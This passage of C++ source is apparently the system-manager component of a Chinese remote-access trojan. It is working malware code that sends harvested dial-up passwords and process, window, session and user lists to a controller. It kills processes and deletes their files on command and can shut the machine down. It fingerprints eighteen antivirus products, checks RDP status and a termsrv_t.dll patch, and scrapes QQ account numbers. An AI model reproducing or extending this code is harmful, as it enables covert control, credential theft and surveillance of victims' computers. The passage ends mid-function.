	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
	
	DWORD	dwOffset = 1;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}
	
	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::TestWindow(LPBYTE lpBuffer)
{
   	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd,lpBuffer,sizeof(DWORD));      //得到窗口句柄
	memcpy(&dHow,lpBuffer+sizeof(DWORD),sizeof(DWORD));     //得到窗口处理参数
	ShowWindow((HWND__ *)hwnd,dHow);
}

void CSystemManager::CloseWindow(LPBYTE lpBuffer)
{
	DWORD hwnd;
	memcpy(&hwnd,lpBuffer,sizeof(DWORD));      //得到窗口句柄 
	::PostMessage((HWND__ *)hwnd,WM_CLOSE,0,0); //向窗口发送关闭消息
	
	Sleep(200);
	SendWindowsList();  //窗口显示刷新
}

void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	nSize -=1;
	char    strProcessName[MAX_PATH] = {0};
	
	for (UINT i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + 1 + i));
		GetModuleFileNameEx(hProcess,NULL,strProcessName, sizeof(strProcessName));
		BOOL bProcess = TerminateProcess(hProcess, 0);

		if (lpBuffer[0] && bProcess)
		{			
			int n = 0;
			while(1)
			{
				DeleteFile(strProcessName);
				Sleep(200);
				if(GetFileAttributes(strProcessName) == -1)  //检查文件不存在  退出
					break;
				n ++ ;
				if(n >= 10)  //无法删除 一段时间后退出
					break;
			}
		}
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	// 稍稍Sleep下，防止出错
	Sleep(100);
}

void CSystemManager::ShutdownWindows( DWORD dwReason )
{
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
}

BOOL CSystemManager::DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	return bResult;	
}

void CSystemManager::SendProcessList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR			szDriveStr[500];
	TCHAR			szDrive[3];
	TCHAR			szDevName[100];
	INT				cchDevName;
	INT				i;
	
	//检查参数
	if(!pszDosPath || !pszNtPath )
		return FALSE;
	
	//获取本地磁盘字符串
	if(GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for(i = 0; szDriveStr[i]; i += 4)
		{
			if(!lstrcmpi(&(szDriveStr[i]), "A:\\") || !lstrcmpi(&(szDriveStr[i]), "B:\\"))
				continue;
			
			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = '\0';
			if(!QueryDosDevice(szDrive, szDevName, 100))//查询 Dos 设备名
				return FALSE;
			
			cchDevName = lstrlen(szDevName);
			if(strncmp(pszDosPath, szDevName, cchDevName) == 0)//命中
			{
				lstrcpy(pszNtPath, szDrive);//复制驱动器
				lstrcat(pszNtPath, pszDosPath + cchDevName);//复制路径
				return TRUE;
			}			
		}
	}
	
	lstrcpy(pszNtPath, pszDosPath);
	
	return FALSE;
}

BOOL GetProcessUserName(HANDLE hProcess, TCHAR * strProcessUser)
{
	HANDLE hToken = NULL;
	BOOL bFuncReturn = FALSE;
	PTOKEN_USER pToken_User = NULL;
	DWORD dwTokenUser = 0;
	TCHAR szAccName[MAX_PATH] = {0};
	TCHAR szDomainName[MAX_PATH] = {0};
	HANDLE hProcessToken = NULL;
	if(hProcess != NULL)
	{
		// 提升本进程的权限
		bFuncReturn = ::OpenProcessToken(hProcess,TOKEN_QUERY,&hToken);
		if( bFuncReturn == 0) // 失败
			return FALSE;
		
		if(hToken != NULL)
		{
			::GetTokenInformation(hToken, TokenUser, NULL,0L, &dwTokenUser);
			if(dwTokenUser>0)
			{
				pToken_User = (PTOKEN_USER)::GlobalAlloc( GPTR, dwTokenUser );
			}
			
			if(pToken_User != NULL)
			{
				bFuncReturn = ::GetTokenInformation(hToken, TokenUser, pToken_User, dwTokenUser, &dwTokenUser);
			}
			
			if(bFuncReturn != FALSE && pToken_User != NULL)
			{
				SID_NAME_USE eUse  = SidTypeUnknown;
				DWORD dwAccName    = 0L; 
				DWORD dwDomainName = 0L;
				PSID  pSid = pToken_User->User.Sid;
				bFuncReturn = ::LookupAccountSid(NULL, pSid, NULL, &dwAccName,
					NULL,&dwDomainName,&eUse );
				
				if(dwAccName>0 && dwAccName < MAX_PATH && dwDomainName>0 && dwDomainName <= MAX_PATH)
				{
					bFuncReturn = ::LookupAccountSid(NULL,pSid,szAccName,&dwAccName,
						szDomainName,&dwDomainName,&eUse );
				}
				
				if( bFuncReturn != 0)
					lstrcpy(strProcessUser,szAccName);

			}
		}
	}
	
	if (pToken_User != NULL)
		::GlobalFree( pToken_User );
	
	if(hToken != NULL)
		::CloseHandle(hToken);
	
	return TRUE;
}
  
LPBYTE CSystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};
	char            strProcessUser[MAX_PATH] = {0};
	TCHAR           szImagePath[MAX_PATH] ={0};
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DWORD           dwWorkingSetSize = 0;
	DWORD           dwFileSize = 0;
	PROCESS_MEMORY_COUNTERS pmc;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	
	if(Process32First(hSnapshot, &pe32))
	{	  
		do
		{      
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				
				if(0 == GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
				{
					lstrcpy(strProcessName, "unknown erro");
					
				}
				else if(!DosPathToNtPath( szImagePath,strProcessName))
				{
					
				}

				memset(strProcessUser,0,sizeof(strProcessUser));
				if (GetProcessUserName(hProcess,strProcessUser))
				{
					if (lstrlen(strProcessUser) == 0)
					{
						lstrcpy(strProcessUser,"ERROR 2");
					}
				}
				else
				{
					lstrcpy(strProcessUser,"ERROR 1");
				}
				
				// 此进程占用数据大小
				dwLength = sizeof(DWORD)*5 + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + lstrlen(strProcessUser) + 3;
				// 缓冲区太小，再重新分配下
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;
				
				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;


				DWORD dwPriClass = GetPriorityClass(hProcess);
 				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD) );
				dwOffset += sizeof(DWORD);

				dwPriClass = pe32.cntThreads;
				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD) );
				dwOffset += sizeof(DWORD);

				memcpy(lpBuffer + dwOffset, strProcessUser, lstrlen(strProcessUser) + 1);
				dwOffset += lstrlen(strProcessUser) + 1;

				ZeroMemory(&pmc,sizeof(pmc));
				pmc.cb = sizeof(PROCESS_MEMORY_COUNTERS);
				if (GetProcessMemoryInfo( hProcess, &pmc, sizeof(pmc)) )
				{
					dwWorkingSetSize = (DWORD)(pmc.WorkingSetSize/1024);		//单位为k
				}
				else
					dwWorkingSetSize = 0;

				memcpy(lpBuffer + dwOffset, &dwWorkingSetSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);


				HANDLE handle = CreateFile(strProcessName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
				if (handle != INVALID_HANDLE_VALUE)
				{
					dwFileSize = GetFileSize(handle, NULL)  / 1024;
					CloseHandle(handle);
				}
				else
					dwFileSize = 0;

				memcpy(lpBuffer + dwOffset, &dwFileSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);

			}

			CloseHandle(hProcess);//新修改
		}
		while(Process32Next(hSnapshot, &pe32));
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	DebugPrivilege(SE_DEBUG_NAME, FALSE); 
	CloseHandle(hSnapshot);
	return lpBuffer;	
}

void CSystemManager::SendWindowsList()
{
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	
	LocalFree(lpBuffer);	
}

LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;	
}

bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	if(!IsWindowVisible(hwnd))
		return true;
	
	DWORD dwLength = 0;
	DWORD dwOffset = 0;
	
	LPBYTE lpBuffer = *(LPBYTE *)lParam;
	
	char strTitle[1024]={0};
	try
	{
		if (!SendMessage(hwnd,WM_GETTEXT,sizeof(strTitle)-1,(LPARAM)strTitle))
			return true;
		
		strTitle[sizeof(strTitle)-1]=0;
		
		if (lstrlen(strTitle) == 0)
			return true;
		
		if (lpBuffer == NULL)
		{
			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
			dwOffset=1;
		}else
		{
			dwOffset = LocalSize(lpBuffer);
			while(*(lpBuffer + dwOffset - 2)==0) dwOffset--;			
		}
		
		dwLength = sizeof(DWORD) + sizeof(DWORD) + lstrlen(strTitle) + 1;
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	}catch (...)
	{
		return true;
	}
	
	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD) ,&hwnd,sizeof(DWORD));

	memcpy(lpBuffer + dwOffset + sizeof(DWORD)*2, strTitle, lstrlen(strTitle) + 1);
	
	*(LPBYTE *)lParam = lpBuffer;
	return true;
}


void CSystemManager::SendUserStateList()
{
	LPBYTE	lpBuffer = getUserStateList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendSysUserList()
{
	LPBYTE	lpBuffer = getSysUserList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
}


bool GetSessionInfo(DWORD dwSessionId, char *str,_WTS_INFO_CLASS Class)  
{  
	LPTSTR pBuffer = NULL;  
	DWORD dwBufferLen;    
	BOOL bRes = WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE,dwSessionId,Class, &pBuffer, &dwBufferLen);    
	if (bRes == FALSE)  
	{  
		return false;  
	}
	
	if(Class == WTSClientAddress)
	{
		PWTS_CLIENT_ADDRESS pWTSCA = (PWTS_CLIENT_ADDRESS)pBuffer;
		wsprintf(str, "%d.%d.%d.%d",pWTSCA->Address[2],pWTSCA->Address[3],pWTSCA->Address[4],pWTSCA->Address[5]); 
	}
	else
	{
		lstrcpy(str,pBuffer);  
	}

	WTSFreeMemory(pBuffer);   
	return true;  
}

LPBYTE CSystemManager::getUserStateList()
{
	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 0;
	DWORD	dwLength = 0;
	char	ConnectionState[MAX_PATH];   

	PWTS_SESSION_INFO ppSessionInfo = NULL;  
	WTS_SESSION_INFO  wts;
	DWORD pCount  = 0;  

	BOOL result = WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &ppSessionInfo, &pCount);  
	if (result == FALSE)
		return NULL;

	char	strUserName[256];  
	char    strSessionId[256];
	char    strClientAddress[256];
	char    strWinStationName[256];
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_ASLIST;
	dwOffset = 1;

	for( DWORD i = 0; i < pCount; i++ )
	{
		wts = ppSessionInfo[i];
		
		DWORD					TSSessionId		  = wts.SessionId;
		LPTSTR					TSpWinStationName = wts.pWinStationName;
		WTS_CONNECTSTATE_CLASS	TSState			  = wts.State;

		//  计算机名称
		memset(strUserName,0,sizeof(strUserName));
		GetSessionInfo(TSSessionId,strUserName,WTSUserName);
		if(lstrlen(strUserName) == 0)
			continue;

		//会话
		memset(strWinStationName,0,sizeof(strWinStationName));
		GetSessionInfo(TSSessionId,strWinStationName, WTSWinStationName);  
		//远程桌面连接IP
		memset(strClientAddress,0,sizeof(strClientAddress));
		GetSessionInfo(TSSessionId,strClientAddress, WTSClientAddress);   
		//会话ID标识
		memset(strSessionId,0,sizeof(strSessionId));
		GetSessionInfo(TSSessionId,strSessionId, WTSSessionId);            


		// 会话状态
		memset(ConnectionState,0,sizeof(ConnectionState));
		switch( TSState )
		{
		case WTSActive:
			lstrcpy(ConnectionState,"Active");
			break;
		case WTSConnected:
			lstrcpy(ConnectionState,"Connected");
			break;
		case WTSConnectQuery:
			lstrcpy(ConnectionState,"ConnectQuery");
			break;
		case WTSShadow:
			lstrcpy(ConnectionState,"Shadow");
			break;
		case WTSDisconnected:
			lstrcpy(ConnectionState,"Disconnected");
			break;
		case WTSIdle:
			lstrcpy(ConnectionState,"SIdle");
			break;
		case WTSListen:
			lstrcpy(ConnectionState,"Listen");
			break;
		case WTSReset:
			lstrcpy(ConnectionState,"Reset");
			break;
		case WTSDown:
			lstrcpy(ConnectionState,"Down");
			break;
		case WTSInit:
			lstrcpy(ConnectionState,"Init");
			break;
		default:
			lstrcpy(ConnectionState,"error");
			break;
		}


		dwLength = lstrlen(strUserName) + lstrlen(strSessionId) + lstrlen(strClientAddress) + lstrlen(strWinStationName) + lstrlen(ConnectionState) + 5;
		// 缓冲区太小，再重新分配下
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);

		memcpy(lpBuffer + dwOffset, strUserName, lstrlen(strUserName) + 1);
		dwOffset += lstrlen(strUserName) + 1;

		memcpy(lpBuffer + dwOffset, strSessionId, lstrlen(strSessionId) + 1);
		dwOffset += lstrlen(strSessionId) + 1;

		memcpy(lpBuffer + dwOffset, strClientAddress, lstrlen(strClientAddress) + 1);
		dwOffset += lstrlen(strClientAddress) + 1;

		memcpy(lpBuffer + dwOffset, strWinStationName, lstrlen(strWinStationName) + 1);
		dwOffset += lstrlen(strWinStationName) + 1;

		memcpy(lpBuffer + dwOffset, ConnectionState, lstrlen(ConnectionState) + 1);
		dwOffset += lstrlen(ConnectionState) + 1;
	}

	// 释放
	WTSFreeMemory(ppSessionInfo); 

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}


void CSystemManager::SendSysInfoList()
{
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, sizeof(tagSystemInfo)+1);
	lpBuffer[0] = TOKEN_SSLIST;	
	if(lpBuffer == NULL)
		return;
	tagSystemInfo m_SysInfo;
	GetSystemInfo(&m_SysInfo);
	memcpy(lpBuffer + 1, &m_SysInfo, sizeof(tagSystemInfo));
	Send(lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

//======================================================================================================================
BOOL GetTerminalState()
{
	SC_HANDLE hSCManager, schService;
	SERVICE_STATUS   ssStatus;
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
	{
		return FALSE;
	}
	schService = OpenService( hSCManager, "TermService", SERVICE_ALL_ACCESS);
	if(schService   ==   NULL)
	{
		return FALSE;
	}
	if (!QueryServiceStatus(schService, &ssStatus))
	{	
		CloseServiceHandle(schService);
		CloseServiceHandle(hSCManager);
		return FALSE;
	}
	CloseServiceHandle(schService);
	CloseServiceHandle(hSCManager);
	if (ssStatus.dwCurrentState != SERVICE_RUNNING)
	{
		return FALSE;
	}
	return TRUE;
}




BOOL bFindTermsrvDll()
{
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	char strDll[MAX_PATH];
	BOOL bRet = FALSE;
	GetSystemDirectory(strDll, sizeof(strDll));
	lstrcat(strDll, "\\termsrv_t.dll");
	
	
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE hProcessSnap= CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	//查找相关的进程
	if(Process32First(hProcessSnap, &pe32))
	{
		do
		{
			HANDLE hModuleHandle = FindModule(pe32.th32ProcessID, strDll);
			if (hModuleHandle != NULL)
			{
				bRet = TRUE;
				break;
			}
			
		}while (Process32Next(hProcessSnap,&pe32));
	}
	CloseHandle(hProcessSnap);
	
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	return bRet;
}

void Get3389State( LPTSTR lpBuffer, UINT uSize)
{
	memset(lpBuffer, 0, uSize);
	
	if (!GetTerminalState())
	{
		lstrcpy(lpBuffer, "未开启3389服务");
		return;
	}
	
	char szCanConnect[32];
	ReadRegEx(HKEY_LOCAL_MACHINE, 
		"SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 
		"fDenyTSConnections", 	REG_DWORD, 	szCanConnect,	NULL,	NULL, 	0);
	
	if (atoi(szCanConnect) != 0)
	{	
		lstrcpy(lpBuffer, "未允许连接3389");
		return;
	}
	else if(!bIsOsXP()) 
	{
		lstrcpy(lpBuffer, "已开启且无需双开");
		return;
	}
	else
	{
		char szDllName[MAX_PATH];
		ReadRegEx(HKEY_LOCAL_MACHINE, 
			"SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters", 
			"ServiceDll", REG_EXPAND_SZ, szDllName, NULL, NULL, 0);
		
		if (strstr(szDllName, "termsrv_t") == 0)
		{
			lstrcpy(lpBuffer, "已开启但未双开");
			return;
		}
		else
		{
			if (bFindTermsrvDll())
			{
				lstrcpy(lpBuffer, "已开启且已双开");
				return;
			}
			else
			{
				lstrcpy(lpBuffer, "已开启但未双开");
				return;
			}
		}
	}
	return;
}
//======================================================================================================================

void GetAntivirus(char *AllName)
{	
	char *str[18][2] = 
	{
		"360tray.exe","360安全卫士",
			"360sd.exe","360杀毒",
			"avp.exe","卡巴斯基",
			"kvmonxp.exe","江民",
			"RavMonD.exe","瑞星",
			"Mcshield.exe","麦咖啡",
			"egui.exe","NOD32",
			"kxetray.exe","金山",
			"TMBMSRV.exe","趋势",
			"Avgui.exe","AVG",
			"Avastsvc.exe","Avast",
			"avguard.exe","小红伞",
			"bdagent.exe","比特梵德",
			"Msmpeng.exe","MSE",
			"spider.exe","Dr.Web",
			"ccapp.exe","Norton",
			"v3lsvc.exe","V3",
			"ayagent.aye","药丸"
	};
	
	PROCESSENTRY32 pe; 
	DWORD dwRet;
	HANDLE hSP = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (hSP)
	{
		for (int i = 0 ; i< 18; i++)
		{
			pe.dwSize = sizeof( pe );
			
			for (dwRet = Process32First(hSP, &pe); dwRet; dwRet = Process32Next(hSP, &pe))
			{
				if (lstrcmpi( str[i][0], pe.szExeFile) == 0)
				{
					lstrcat(AllName , str[i][1]);
					lstrcat(AllName , " ");
					
					break;
				}
			}
		}
	}
	
	CloseHandle(hSP);
	
	if (lstrlen(AllName) == 0)
		lstrcpy(AllName,"未发现");
	
	return;
}

UINT Get3389Port( LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[MAX_PATH] = {0};
	memset(lpBuffer, 0, uSize);
	
	lstrcpy(strSubKey, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp");
	
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "PortNumber", REG_DWORD, (char *)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		lstrcpy(lpBuffer,"出错");
	
	return lstrlen(lpBuffer);
}


void Get_LogUser(char *lpUserName,DWORD nNameLen)
{
	DWORD	dwProcessID = GetProcessID("explorer.exe");
	if (dwProcessID == 0)
		return ;
	
	BOOL fResult = FALSE;
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;
	TOKEN_USER *pTokenUser = NULL;
	
	__try
	{
		// Open the process with PROCESS_QUERY_INFORMATION access
		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
		if (hProc == NULL)
		{
			__leave;
		}
		fResult = OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
		if(!fResult) 
		{
			__leave;
		}
		
		DWORD dwNeedLen = 0;	
		fResult = GetTokenInformation(hToken,TokenUser, NULL, 0, &dwNeedLen);
		if (dwNeedLen > 0)
		{
			pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
			fResult = GetTokenInformation(hToken,TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
			if (!fResult)
			{
				__leave;
			}
		}
		else
		{
			__leave;
		}
		
		SID_NAME_USE sn;
		TCHAR szDomainName[MAX_PATH];
		DWORD dwDmLen = MAX_PATH;
		
		fResult = LookupAccountSid(NULL, pTokenUser->User.Sid, lpUserName, &nNameLen,
			szDomainName, &dwDmLen, &sn);
	}
	__finally
	{
		if (hProc)
			::CloseHandle(hProc);
		if (hToken)
			::CloseHandle(hToken);
		if (pTokenUser)
			delete[] (char*)pTokenUser;
	}
} 


char *GetQQ()
{
	char *szQQNum = new char[2048];
	memset(szQQNum, 0, 260);
	char szText[2048] = {0};
    char szQQNumber[2048] = {0};
    HWND hWnd = FindWindowA("CTXOPConntion_Class", NULL);
	
	while (hWnd)
	{
		char szClassName[MAX_PATH] = {0};
		GetClassName(hWnd, szClassName, MAX_PATH);
		if (strcmp(szClassName, "CTXOPConntion_Class") == 0)
		{	
			// 得到类似OP_12345678的字符串
			if (hWnd)
			{
				GetWindowText(hWnd, szText, MAX_PATH);
			}
			// 得到12345678 qq号
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);
			//printf("%s\n", szText);
			//printf("%s\n", szQQNumber);
			//printf("%s\n", szClassName);
			if (lstrlen(szQQNum) != 0)
			{	
				strcat(szQQNum, "|");
			}
			strcat(szQQNum, szQQNumber);
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
	}
	if (lstrlen(szQQNum) == 0)
	{
		strcpy(szQQNum, "-/-");
	}
	return szQQNum;
}

void CSystemManager::GetSystemInfo(tagSystemInfo* pSysInfo)
{
	ZeroMemory(pSysInfo,sizeof(tagSystemInfo));
	//获取CPU信息===============================
	if(
		!ReadRegEx
		(
		HKEY_LOCAL_MACHINE, 
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\0", 
		"ProcessorNameString",
		REG_SZ, 
		pSysInfo->szCpuInfo, 
		NULL,
		lstrlen(pSysInfo->szCpuInfo),
		0)
		)
		strcpy(pSysInfo->szCpuInfo,"Find CPU infomation error");
	
	//获取运行时间============================
	DWORD dwTime,dwDay,dwHour,dwMin;
	dwTime = GetTickCount();
	dwDay  = dwTime / (1000 * 60 * 60 * 24);
	dwTime = dwTime % (1000 * 60 * 60 * 24);
	dwHour = dwTime / (1000 * 60 * 60);
	dwTime = dwTime % (1000 * 60 * 60);
	dwMin  = dwTime / (1000 * 60);
	wsprintf(pSysInfo->szActiveTime, "已运行 %d天 %d小时 %d分钟", dwDay,dwHour,dwMin);
	
	//获取杀毒软件========================
    GetAntivirus(pSysInfo->szAntiVirus);
	
	//获取计算机名========================
	gethostname(pSysInfo->szPcName,sizeof(pSysInfo->szPcName));

	//获取用户名========================
    Get_LogUser(pSysInfo->szUserName,sizeof(pSysInfo->szUserName));
	//////////////////////////////////////////////////////////////////////////
	MEMORYSTATUSEX		Meminfo;
	unsigned __int64	dSize;
	memset(&Meminfo, 0, sizeof(Meminfo));
	Meminfo.dwLength = sizeof(Meminfo);
	GlobalMemoryStatusEx(&Meminfo);
	
	// 内存
	dSize = (unsigned __int64)Meminfo.ullTotalPhys;
	dSize = dSize /1024/1024+1;
	pSysInfo->szMemory = dSize;
	
	// 可用内存
	dSize = (unsigned __int64)Meminfo.ullAvailPhys;
	dSize = dSize /1024/1024+1;
	pSysInfo->szMemoryFree = dSize;
	
	ULARGE_INTEGER nTotalBytes,
		nTotalFreeBytes,
		nTotalAvailableBytes;
	ULONG nAllGB  = 0, 
		nFreeGB = 0;
    DWORD drivertype;
    char  driver[10] = {0};
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = nAllGB + nTotalBytes.QuadPart/1024/1024/1024;
		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;
    }
	// 硬盘
	pSysInfo->szDriveSize     = nAllGB;
	// 可用硬盘
	pSysInfo->szDriveFreeSize = nFreeGB;
	
	//读取远程端口
	Get3389Port(pSysInfo->szRemotePort,sizeof(pSysInfo->szRemotePort));
	
	// 读取3389状态
	Get3389State(pSysInfo->szOpenInfo,sizeof(pSysInfo->szOpenInfo));
	
	// 服务端位置
	GetModuleFileName(hDllModule,pSysInfo->szDLLPath,sizeof(pSysInfo->szDLLPath));
	
	// 分辨率
	wsprintf(pSysInfo->szScrxy,"%d * %d",GetSystemMetrics(SM_CXSCREEN),GetSystemMetrics(SM_CYSCREEN));
	
	//QQ
	lstrcpy(pSysInfo->szQQNum,GetQQ());
	return;
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

LPBYTE CSystemManager::getSysUserList()
{
    //遍历开始   
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_USLIST;
	DWORD			dwOffset = 1;
	
	char user_name[50];
	char group_name[50];
	
    LPUSER_INFO_0   bufptr   =   NULL;   
    LPUSER_INFO_0   pTmpBuf  =   NULL;   
	LPUSER_INFO_1   puiVal   =   NULL;
	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL; 
    DWORD   dwLevel        = 0,
		dwEntriesRead  = 0,
		dwTotalEntries = 0, 
		dwResumeHandle = 0,
		dwPrefMaxLen = MAX_PREFERRED_LENGTH;  
	
    NET_API_STATUS   nStatus = NetUserEnum(NULL,dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&bufptr,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);   
	
    if((nStatus   ==   NERR_Success)   ||   (nStatus   ==   ERROR_MORE_DATA))   
	{   
		if((pTmpBuf = bufptr) != NULL)
		{
			
			for(DWORD  i=0;i<dwEntriesRead;++i)   
			{ 
				memset(user_name,0,sizeof(user_name));
				wcstombs(user_name,pTmpBuf->usri0_name,50);   
				
				memcpy(lpBuffer + dwOffset, user_name, lstrlen(user_name)+1);
